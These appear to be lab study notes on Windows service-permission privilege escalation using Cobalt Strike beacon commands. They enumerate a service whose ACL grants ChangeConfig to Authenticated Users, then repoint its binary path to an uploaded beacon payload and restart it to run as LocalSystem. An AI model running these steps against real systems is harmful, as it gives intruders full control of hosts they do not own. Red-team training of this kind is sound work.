```
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
```

https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
```
beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access

ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
```

Validate path
```
beacon> run sc qc VulnService2
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService2
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Vulnerable Services\Service 2.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService2
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
exploit
```
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\tcp-local_x64.svc.exe

beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
[SC] ChangeServiceConfig SUCCESS

beacon> run sc stop VulnService2
beacon> run sc start VulnService2
```